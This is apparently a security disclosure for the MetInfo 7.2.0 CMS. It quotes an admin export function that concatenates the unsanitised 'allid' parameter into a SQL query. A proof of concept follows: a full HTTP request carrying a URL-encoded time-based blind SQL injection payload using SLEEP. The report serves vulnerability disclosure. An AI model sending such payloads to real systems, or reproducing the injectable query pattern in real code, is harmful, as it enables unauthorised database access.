## 1.Technical Description:
locate in /app/system/feedback/admin/feedback_admin.class.php line:583 to 673:
```
function doexportList()
    {
        global $_M;
        $class1 = is_numeric($_M['form']['class1']) ? $_M['form']['class1'] : '';
        $class2 = is_numeric($_M['form']['class2']) ? $_M['form']['class2'] : '';
        $class3 = is_numeric($_M['form']['class3']) ? $_M['form']['class3'] : '';
        $allid = $_M['form']['allid'];
        $lang = $this->lang;
        $keyword = $_M['form']['keyword'];
        $search_type = $_M['form']['search_type'];
		 ...
		 ...
        $where = " lang='{$lang}' ";
        if (isset($_M['form']['jobid']) && $_M['form']['jobid']) {
            $where .= " AND jobid='{$_M['form']['jobid']}' ";
        }

        switch ($search_type) {
            case 0:
                break;
            case 1:
                $where .= "AND readok = '0' ";
                break;
            case 2:
                $where .= "AND readok = '1' ";
                break;
        }

        if ($allid) {
            $where .= " AND `id` in ({$allid}) ";
        }

        ...
        ...
       if ($search_sql) {
            $where .= " AND  id IN ( {$search_sql}) ";
        }
        //end参数筛选

        $order = ' ORDER BY addtime desc ';

        $query = "SELECT * FROM {$_M['table']['cv']} WHERE {$where} {$order}";
        $cv_list = DB::get_all($query);

        ...
        ...
        ...
    }
```
## 2.poc
Use the Google Chrome open this test site.download the latest version（ https://www.metinfo.cn/download/)
```
POST /MetInfo7.2.0/admin/index.php?lang=cn&n=job&c=job_manage&a=doexportList&allid=1%29%20%41%4e%44%20%28%53%45%4c%45%43%54%20%36%32%36%38%20%46%52%4f%4d%20%28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%32%29%29%29%4f%66%69%42%29%2d%2d%20%67%69%6d%7 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 0
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/MetInfo7.2.0/admin/
Cookie: PHPSESSID=8d5lno19uc4t6aj69vthkcihc3; admin_lang=cn; arrlanguage=metinfo; app_href_source=myapp/free; Hm_lvt_520556228c0113270c0c772027905838=1615185471; Hm_lpvt_520556228c0113270c0c772027905838=1615253331; XDEBUG_SESSION=XDEBUG_ECLIPSE; re_url=http%3A%2F%2F127.0.0.1%2FMetInfo7.2.0%2Fadmin%2F%3Flang%3Dcn%26n%3Dui_set; met_auth=e628Iw2z8wMxsOfO66rtN130691lXezS3uyrO69BQYo8Iqk1SJey5E%2FZV1BNaRwgLlypb9s3DmhhnPQH%2FKYgqtRD2Q; met_key=9Kzg3Bm; page_iframe_url=http%3A%2F%2F127.0.0.1%2FMetInfo7.2.0%2Findex.php%3Flang%3Dcn%26pageset%3D1; met_auths=1


```
## Reporter:
jiedeidei from Topsec Alpha Lab
